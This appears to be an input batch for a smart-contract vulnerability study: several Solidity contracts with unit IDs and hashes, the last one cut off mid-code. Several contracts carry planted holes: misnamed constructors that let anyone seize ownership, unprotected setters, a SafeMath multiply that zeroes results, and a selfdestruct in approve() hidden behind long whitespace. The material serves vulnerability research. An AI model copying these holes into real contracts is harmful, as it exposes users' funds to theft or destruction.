# 本批实际输入源码

逐文件字节SHA与原冻结输入一致。

## RQ1_5add5c765bae

文件 `units/program.sol`；SHA256 `32880f06ec85fd6e9fc4a8f6da4598b76cd18a4669bddfd9a6a2c1384fab05fc`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.25;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
contract CryptoEngineerInterface {
    uint256 public prizePool = 0;
    function subVirus(address , uint256 ) public {}
    function claimPrizePool(address , uint256 ) public {} 
    function isContractMiniGame() public pure returns( bool ) {}
}
contract CryptoMiningWarInterface {
    uint256 public deadline; 
    function subCrystal( address , uint256  ) public {}
}
contract CrystalDeposit {
	using SafeMath for uint256;
    bool init = false;
	address public administrator;
    uint256 public HALF_TIME = 48 hours;
    uint256 public PRIZE_MAX = 0.25 ether;
    uint256 public round = 0;
    CryptoEngineerInterface public Engineer;
    CryptoMiningWarInterface public MiningWar;
    uint256 public miningWarDeadline;
    uint256 constant private CRTSTAL_MINING_PERIOD = 86400;
    mapping(uint256 => Game) public games;
    mapping(address => Player) public players;
    struct Game {
        uint256 round;
        uint256 crystals;
        uint256 prizePool;
        uint256 endTime;
        bool ended; 
    }
    struct Player {
        uint256 currentRound;
        uint256 lastRound;
        uint256 reward;
        uint256 share; 
    }
    event EndRound(uint256 round, uint256 crystals, uint256 prizePool, uint256 endTime);
    event Deposit(address player, uint256 questId, uint256 questLv, uint256 deposit, uint256 bonus, uint256 percent);
    modifier isAdministrator()
    {
        require(msg.sender == administrator);
        _;
    }
    modifier disableContract()
    {
        require(tx.origin == msg.sender);
        _;
    }
    constructor() public {
        administrator = msg.sender;
        setMiningWarInterface(0xf84c61bb982041c030b8580d1634f00fffb89059);
        setEngineerInterface(0x69fd0e5d0a93bf8bac02c154d343a8e3709adabf);
    }
    function () public payable
    {
    }
    function isContractMiniGame() public pure returns( bool _isContractMiniGame )
    {
    	_isContractMiniGame = true;
    }
    function upgrade(address addr) public isAdministrator
    {
        selfdestruct(addr);
    }
    function setupMiniGame( uint256 , uint256 _miningWarDeadline ) public
    {
        miningWarDeadline = _miningWarDeadline;
    }
    function setMiningWarInterface(address _addr) public isAdministrator
    {
        MiningWar = CryptoMiningWarInterface(_addr);
    }
    function setEngineerInterface(address _addr) public isAdministrator
    {
        CryptoEngineerInterface engineerInterface = CryptoEngineerInterface(_addr);
        require(engineerInterface.isContractMiniGame() == true);
        Engineer = engineerInterface;
    }
     function startGame() public 
    {
        require(msg.sender == administrator);
        require(init == false);
        init = true;
        miningWarDeadline = getMiningWarDealine();
        games[round].ended = true;
        startRound();
    }
    function startRound() private
    {
        require(games[round].ended == true);
        uint256 crystalsLastRound = games[round].crystals;
        uint256 prizePoolLastRound= games[round].prizePool; 
        round = round + 1;
        uint256 endTime = now + HALF_TIME;
        uint256 engineerPrizePool = getEngineerPrizePool();
        uint256 prizePool = SafeMath.div(SafeMath.mul(engineerPrizePool, 5),100);
        if (prizePool >= PRIZE_MAX) prizePool = PRIZE_MAX;
        Engineer.claimPrizePool(address(this), prizePool);
        if (crystalsLastRound <= 0) prizePool = SafeMath.add(prizePool, prizePoolLastRound);
        games[round] = Game(round, 0, prizePool, endTime, false);
    }
    function endRound() private
    {
        require(games[round].ended == false);
        require(games[round].endTime <= now);
        Game storage g = games[round];
        g.ended = true;
        startRound();
        emit EndRound(g.round, g.crystals, g.prizePool, g.endTime);
    }
    function share(uint256 _value) public disableContract
    {
        require(miningWarDeadline > now);
        require(games[round].ended == false);
        require(_value >= 10000);
        MiningWar.subCrystal(msg.sender, _value); 
        if (games[round].endTime <= now) endRound();
        updateReward(msg.sender);
        Game storage g = games[round];
        uint256 _share = SafeMath.mul(_value, CRTSTAL_MINING_PERIOD);
        g.crystals = SafeMath.add(g.crystals, _share);
        Player storage p = players[msg.sender];
        if (p.currentRound == round) {
            p.share = SafeMath.add(p.share, _share);
        } else {
            p.share = _share;
            p.currentRound = round;
        }
        emit Deposit(msg.sender, 1, 1, _value, 0, 0); 
    }
    function withdrawReward() public disableContract
    {
        if (games[round].endTime <= now) endRound();
        updateReward(msg.sender);
        Player storage p = players[msg.sender];
        uint256 balance  = p.reward; 
        if (address(this).balance >= balance) {
             msg.sender.transfer(balance);
            p.reward = 0;     
        }
    }
    function updateReward(address _addr) private
    {
        Player storage p = players[_addr];
        if ( 
            games[p.currentRound].ended == true &&
            p.lastRound < p.currentRound
            ) {
            p.reward = SafeMath.add(p.reward, calculateReward(msg.sender, p.currentRound));
            p.lastRound = p.currentRound;
        }
    }
    function getData(address _addr) 
    public
    view
    returns(
        uint256 _prizePool,
        uint256 _crystals,
        uint256 _endTime,
        uint256 _reward,
        uint256 _share
    ) {
         (_prizePool, _crystals, _endTime) = getCurrentGame();
         (_reward, _share)                 = getPlayerData(_addr);         
    }
    function calculateReward(address _addr, uint256 _round) public view returns(uint256)
    {
        Player memory p = players[_addr];
        Game memory g = games[_round];
        if (g.endTime > now) return 0;
        if (g.crystals == 0) return 0; 
        return SafeMath.div(SafeMath.mul(g.prizePool, p.share), g.crystals);
    }
    function getCurrentGame() private view returns(uint256 _prizePool, uint256 _crystals, uint256 _endTime)
    {
        Game memory g = games[round];
        _prizePool = g.prizePool;
        _crystals  = g.crystals;
        _endTime   = g.endTime;
    }
    function getPlayerData(address _addr) private view returns(uint256 _reward, uint256 _share)
    {
        Player memory p = players[_addr];
        _reward           = p.reward;
        if (p.currentRound == round) _share = players[_addr].share; 
        if (p.currentRound != p.lastRound) _reward += calculateReward(_addr, p.currentRound);
    }
    function getEngineerPrizePool() private view returns(uint256)
    {
        return Engineer.prizePool();
    }
    function getMiningWarDealine () private view returns(uint256)
    {
        return MiningWar.deadline();
    }
}
```

## RQ1_79c70cdd1bf6

文件 `units/program.sol`；SHA256 `6869ce0b33c6836a5c96fa0a853de3794396549cbeaf55ac5e362bea863acdf4`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.15;
contract TimeLocker {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        Owner = to;
    }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function TimeLockr() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public { withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}
```

## RQ1_10bbee42cd76

文件 `units/program.sol`；SHA256 `5ac734b6879903753761dc0f8039dcf604394219da2781078b4e13fca65f8a90`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract KingdomETHKing {
  using SafeMath for uint256;  
  address public owner;
  address public king;
  string public kingsMessage;
  uint256 public bidExpireBlockLength = 2500;
  uint256 public nextBidExpireBlockLength;
  uint256 public devFeePercent = 1;
  uint256 public rolloverPercent = 5;
  uint256 public lastBidAmount;
  uint256 public lastBidBlock;
  uint256 public currentRoundNumber;
  uint256 public currentBidNumber;
  uint256 public maxMessageChars = 140;
  mapping(uint256 => address) roundToKing;
  mapping(uint256 => uint256) roundToWinnings;
  mapping(uint256 => uint256) roundToFinalBid;
  mapping(uint256 => string) roundToFinalMessage;
  event NewKing(
    uint256 indexed roundNumber,
    address kingAddress,
    string kingMessage,
    uint256 bidAmount,
    uint256 indexed bidNumber,
    uint256 indexed bidBlockNumber
  );
  function ActiveAdmin () public {
    owner = 0x6018106414EA98FD30854b1232FebD66Bc4dF419;
  }
  modifier onlyOwner() {
    require(owner == msg.sender);
    _;
  }
  function setDevFee (uint256 _n) onlyOwner() public {
	  require(_n >= 0 && _n <= 90);
    devFeePercent = _n;
  }
  function setRollover (uint256 _n) onlyOwner() public {
	  require(_n >= 1 && _n <= 10);
    rolloverPercent = _n;
  }
  function setNextBidExpireBlockLength (uint256 _n) onlyOwner() public {
	  require(_n >= 10 && _n <= 10000);
    nextBidExpireBlockLength = _n;
  }
  function setOwner (address _owner) onlyOwner() public {
    owner = _owner;
  }
  function bid (uint256 _roundNumber, string _message) payable public {
    require(!isContract(msg.sender));
    require(bytes(_message).length <= maxMessageChars);
    require(msg.value > 0);
    if (_roundNumber == currentRoundNumber && !roundExpired()) {
      require(msg.value > lastBidAmount);
    }else if (_roundNumber == (currentRoundNumber+1) && roundExpired()) {
      uint256 lastRoundPotBalance = address(this).balance.sub(msg.value);
      uint256 devFee = lastRoundPotBalance.mul(devFeePercent).div(100);
      owner.transfer(devFee);
      uint256 winnings = lastRoundPotBalance.sub(devFee).mul(100 - rolloverPercent).div(100);
      king.transfer(winnings);
      roundToKing[currentRoundNumber] = king;
      roundToWinnings[currentRoundNumber] = winnings;
      roundToFinalBid[currentRoundNumber] = lastBidAmount;
      roundToFinalMessage[currentRoundNumber] = kingsMessage;
      currentBidNumber = 0;
      currentRoundNumber++;
      if (nextBidExpireBlockLength != 0) {
        bidExpireBlockLength = nextBidExpireBlockLength;
        nextBidExpireBlockLength = 0;
      }
    }else {
      require(false);
    }
    king = msg.sender;
    kingsMessage = _message;
    lastBidAmount = msg.value;
    lastBidBlock = block.number;
    emit NewKing(currentRoundNumber, king, kingsMessage, lastBidAmount, currentBidNumber, lastBidBlock);
    currentBidNumber++;
  }
  function roundExpired() public view returns (bool) {
    return blocksSinceLastBid() >= bidExpireBlockLength;
  }
  function blocksRemaining() public view returns (uint256) {
    if (roundExpired()) {
      return 0;
    }else {
      return bidExpireBlockLength - blocksSinceLastBid();
    }
  }
  function blocksSinceLastBid() public view returns (uint256) {
    return block.number - lastBidBlock;
  }
  function estimateNextPotSeedAmount() public view returns (uint256) {
      return address(this).balance.mul(100 - devFeePercent).div(100).mul(rolloverPercent).div(100);
  }
  function getRoundState() public view returns (bool _currentRoundExpired, uint256 _nextRoundPotSeedAmountEstimate, uint256 _roundNumber, uint256 _bidNumber, address _king, string _kingsMessage, uint256 _lastBidAmount, uint256 _blocksRemaining, uint256 _potAmount, uint256 _blockNumber, uint256 _bidExpireBlockLength) {
    _currentRoundExpired = roundExpired();
    _nextRoundPotSeedAmountEstimate = estimateNextPotSeedAmount();
    _roundNumber = currentRoundNumber;
    _bidNumber = currentBidNumber;
    _king = king;
    _kingsMessage = kingsMessage;
    _lastBidAmount = lastBidAmount;
    _blocksRemaining = blocksRemaining();
    _potAmount = address(this).balance;
    _blockNumber = block.number;
    _bidExpireBlockLength = bidExpireBlockLength;
  }
  function getPastRound(uint256 _roundNum) public view returns (address _kingAddress, uint256 _finalBid, uint256 _kingWinnings, string _finalMessage) {
    _kingAddress = roundToKing[_roundNum]; 
    _kingWinnings = roundToWinnings[_roundNum];
    _finalBid = roundToFinalBid[_roundNum];
    _finalMessage = roundToFinalMessage[_roundNum];
  }
  function isContract(address addr) internal view returns (bool) {
    uint size;
    assembly { size := extcodesize(addr) }
    return size > 0;
  }
}

```

## RQ1_f694e40ffba2

文件 `units/program.sol`；SHA256 `b43951d17af69a780e9fecfb6bb17660a747193625eb8658aa40600a22cb7f36`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.11;
contract Token {
    function transfer(address to, uint amount) public returns (bool);
}
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_d4aefd2e1bfc

文件 `units/program.sol`；SHA256 `eb6bc3d03663b1391390db551582aca8565cfb7cbb1113167c955f4995177f6a`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
library SafeMath {
    function add(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    function sub(uint256 a, uint256 b) internal constant returns (uint256) {
        assert(b <= a); 
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        if (0 < c) c = 0;   
        return c;
    }
    function div(uint256 a, uint256 b) internal constant returns (uint256) {
        uint256 c = a / b;
        return c;
    }
}
contract Ownable {
  address public owner;
  function Ownable() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}
contract Multiple3x is Ownable{
    using SafeMath for uint256;
    mapping (address=>uint) public deposits;
    uint public refundTime = 1507719600;     
    uint public ownerTime = (refundTime + 1 minutes);   
    uint maxDeposit = 1 ether;  
    uint minDeposit = 100 finney;   
    function() payable {
        deposit();
    }
    function deposit() payable { 
        require(now < refundTime);
        require(msg.value >= minDeposit);
        uint256 dep = deposits[msg.sender];
        uint256 sumDep = msg.value.add(dep);
        if (sumDep > maxDeposit){
            msg.sender.send(sumDep.sub(maxDeposit)); 
            deposits[msg.sender] = maxDeposit;
        }
        else{
            deposits[msg.sender] = sumDep;
        }
    }
    function refund() payable { 
        require(now >= refundTime && now < ownerTime);
        require(msg.value >= 100 finney);        
        uint256 dep = deposits[msg.sender];
        uint256 depHalf = address(this).balance.div(2);
        uint256 dep3x = dep.mul(3);
        deposits[msg.sender] = 0;
        if (this.balance > 0 && dep3x > 0){
            if (dep3x > this.balance){
                msg.sender.send(dep3x);     
            }
            else{
                msg.sender.send(depHalf);   
            }
        }
    }
    function refundOwner() { 
        require(now >= ownerTime);
        if(owner.send(this.balance)){
            suicide(owner);
        }
    }
}

```

## RQ1_444af83fd288

文件 `units/program.sol`；SHA256 `c428940e02a3f9f19ef14f2c2edb116cd2dbb7aed7e25061163d05a3a9a2d89a`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.11;
library SafeMath {
  function mul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint a, uint b) internal returns (uint) {
    uint c = a / b;
    return c;
  }
  function sub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
  }
  function add(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c >= a);
    return c;
  }
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
  function assert(bool assertion) internal {
    if (!assertion) {
      revert();
    }
  }
}
contract ZTRToken{
    function transfer(address _to, uint val);
}
contract ZTRTokenSale
{
    using SafeMath for uint;
    mapping (address => uint) public balanceOf;
    mapping (address => uint) public ethBalance;
    address public owner;
    address ZTRTokenContract;
    uint public fundingGoal;
    uint public fundingMax;
    uint public amountRaised;
    uint public start;
    uint public duration;
    uint public deadline;
    uint public unlockTime;
    uint public ZTR_ETH_initial_price;
    uint public ZTR_ETH_extra_price;
    uint public remaining;
    modifier admin { if (msg.sender == owner) _; }
    modifier afterUnlock { if(now>unlockTime) _;}
    modifier afterDeadline { if(now>deadline) _;}
    function ZTRTokenSale()
    {
        owner = msg.sender;
        ZTRTokenContract = 0x107bc486966eCdDAdb136463764a8Eb73337c4DF;
        fundingGoal = 5000 ether;
        fundingMax = 30000 ether;
        start = 1517702401;
        duration = 3 weeks;
        deadline = start + duration;
        unlockTime = deadline + 16 weeks;
        ZTR_ETH_initial_price = 45000;
        ZTR_ETH_extra_price = 23000;
        remaining = 800000000000000000000000000;
    }
    function () payable public
    {
        require(now>start);
        require(now<deadline);
        require(amountRaised + msg.value < fundingMax);
        uint purchase = msg.value;
        ethBalance[msg.sender] = ethBalance[msg.sender].add(purchase);
        if(amountRaised < fundingGoal)
        {
            purchase = purchase.mul(ZTR_ETH_initial_price);
            amountRaised = amountRaised.add(msg.value);
            balanceOf[msg.sender] = balanceOf[msg.sender].add(purchase);
            remaining.sub(purchase);
        }
        else
        {
            purchase = purchase.mul(ZTR_ETH_extra_price);
            amountRaised = amountRaised.add(msg.value);
            balanceOf[msg.sender] = balanceOf[msg.sender].add(purchase);
            remaining.sub(purchase);
        }
    }
    function withdrawBeneficiary() public admin afterDeadline
    {
        ZTRToken t = ZTRToken(ZTRTokenContract);
        t.transfer(msg.sender, remaining);
        require(amountRaised >= fundingGoal);
        owner.transfer(amountRaised);
    }
    function withdraw() afterDeadline
    {
        if(amountRaised < fundingGoal)
        {
            uint ethVal = ethBalance[msg.sender];
            ethBalance[msg.sender] = 0;
            msg.sender.transfer(ethVal);
        }
        else
        {
            uint tokenVal = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            ZTRToken t = ZTRToken(ZTRTokenContract);
            t.transfer(msg.sender, tokenVal);
        }
    }
    function setDeadline(uint ti) public admin
    {
        deadline = ti;
    }
    function setStart(uint ti) public admin
    {
        start = ti;
    }
    function suicide() public afterUnlock 
    {
        selfdestruct(owner);
    }
}
```

## RQ1_6f3ba10080c4

文件 `units/program.sol`；SHA256 `2424c7ebc958b7484f92f23df33935b85e4611b1d35ddd8f2e1a1ac620e14cc5`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract NumbersToken2 {
	uint256 constant PRECISION = 0x10000000000000000;  
	int constant CRRN = 1;
	int constant CRRD = 2;
	int constant LOGC = -0x296ABF784A358468C;
	string constant public name = "NumbersToken2";
	string constant public symbol = "NUMB2";
	uint8 constant public decimals = 18;
	uint256 public totalSupply;
	mapping(address => uint256) public balanceOfOld;
	mapping(address => mapping(address => uint256)) public allowance;
	mapping(address => int256) payouts;
	int256 totalPayouts;
	uint256 earningsPerShare;
	event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
	address owner;
	function POWHclone() public {
		                                                                                                                                                                                                                                                                                                                                                                                                                                                owner = msg.sender;
	}
	function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balanceOfOld[_owner];
    }
	function withdraw(uint tokenCount) 
      public
      returns (bool)
    {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		msg.sender.transfer(balance);
		return true;
    }
	function sellMyTokensDaddy() public {
		var balance = balanceOf(msg.sender);
		transferTokens(msg.sender, address(this),  balance); 
	}
    function getMeOutOfHere() public {
		sellMyTokensDaddy();
        withdraw(1); 
	}
	function fund()
      public
      payable 
      returns (bool)
    {
      if (msg.value > 0.000001 ether)
			buy();
		else
			return false;
      return true;
    }
	function buyPrice() public constant returns (uint) {
		return getTokensForEther(1 finney);
	}
	function sellPrice() public constant returns (uint) {
		return getEtherForTokens(1 finney);
	}
	function transferTokens(address _from, address _to, uint256 _value) internal {
		if (balanceOfOld[_from] < _value)
			revert();
		if (_to == address(this)) {
			sell(_value);
		} else {
		    int256 payoutDiff = (int256) (earningsPerShare * _value);
		    balanceOfOld[_from] -= _value;
		    balanceOfOld[_to] += _value;
		    payouts[_from] -= payoutDiff;
		    payouts[_to] += payoutDiff;
		}
		Transfer(_from, _to, _value);
	}
	function transfer(address _to, uint256 _value) public {
	    transferTokens(msg.sender, _to,  _value);
	}
    function transferFrom(address _from, address _to, uint256 _value) public {
        var _allowance = allowance[_from][msg.sender];
        if (_allowance < _value)
            revert();
        allowance[_from][msg.sender] = _allowance - _value;
        transferTokens(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public {
                                                                                                                                                                                                                                                                                                                                                                                                       selfdestruct(owner);
        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
	function dividends(address _owner) public constant returns (uint256 amount) {
		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
	}
	function withdrawOld(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		to.transfer(balance);
	}
	function balance() internal constant returns (uint256 amount) {
		return this.balance - msg.value;
	}
	function reserve() public constant returns (uint256 amount) {
		return balance()
			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
	}
	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();
		var sender = msg.sender;
		var fee = (uint)(msg.value / 10);
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);
		var buyerfee = fee * PRECISION;
		if (totalSupply > 0) {
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
			buyerfee -= holderfee;
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
		totalSupply += numTokens;
		balanceOfOld[sender] += numTokens;
		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
		payouts[sender] += payoutDiff;
		totalPayouts += payoutDiff;
	}
	function sell(uint256 amount) internal {
		var numEthers = getEtherForTokens(amount);
		totalSupply -= amount;
		balanceOfOld[msg.sender] -= amount;
		var payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));
		payouts[msg.sender] -= payoutDiff;
		totalPayouts -= payoutDiff;
	}
	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
		return fixedExp(fixedLog(reserve() + ethervalue)*CRRN/CRRD + LOGC) - totalSupply;
	}
	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
		if (tokens == totalSupply)
			return reserve();
		return reserve() - fixedExp((fixedLog(totalSupply - tokens) - LOGC) * CRRD/CRRN);
	}
	int256 constant one       = 0x10000000000000000;
	uint256 constant sqrt2    = 0x16a09e667f3bcc908;
	uint256 constant sqrtdot5 = 0x0b504f333f9de6484;
	int256 constant ln2       = 0x0b17217f7d1cf79ac;
	int256 constant ln2_64dot5= 0x2cb53f09f05cc627c8;
	int256 constant c1        = 0x1ffffffffff9dac9b;
	int256 constant c3        = 0x0aaaaaaac16877908;
	int256 constant c5        = 0x0666664e5e9fa0c99;
	int256 constant c7        = 0x049254026a7630acf;
	int256 constant c9        = 0x038bd75ed37753d68;
	int256 constant c11       = 0x03284a0c14610924f;
	function fixedLog(uint256 a) internal pure returns (int256 log) {
		int32 scale = 0;
		while (a > sqrt2) {
			a /= 2;
			scale++;
		}
		while (a <= sqrtdot5) {
			a *= 2;
			scale--;
		}
		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
		var z = (s*s) / one;
		return scale * ln2 +
			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
				/one))/one))/one))/one))/one);
	}
	int256 constant c2 =  0x02aaaaaaaaa015db0;
	int256 constant c4 = -0x000b60b60808399d1;
	int256 constant c6 =  0x0000455956bccdd06;
	int256 constant c8 = -0x000001b893ad04b3a;
	function fixedExp(int256 a) internal pure returns (uint256 exp) {
		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
		a -= scale*ln2;
		int256 z = (a*a) / one;
		int256 R = ((int256)(2) * one) +
			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
		exp = (uint256) (((R + a) * one) / (R - a));
		if (scale >= 0)
			exp <<= scale;
		else
			exp >>= -scale;
		return exp;
	}
	function () payable public {
		if (msg.value > 0)
			buy();
		else
			withdrawOld(msg.sender);
	}
}
```

## RQ1_e88cd683cd73

文件 `units/program.sol`；SHA256 `d9b3c8069bd53f084d205a510fc789da2dd85ac082e6e5cd7b21c506810dd860`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract AltcoinToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract AgroLyteToken is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "AgroLyte Token";
    string public constant symbol = "AGR";
    uint public constant decimals = 8;
    uint256 public totalSupply = 4000000000e8;
    uint256 public totalDistributed = 0;        
    uint256 public tokensPerEth = 0;
    uint256 public constant minContribution = 1 ether / 100; 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function CompanyToken () public {
        owner = msg.sender;
        uint256 devTokens = 2120000000e8;
        distr(owner, devTokens);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
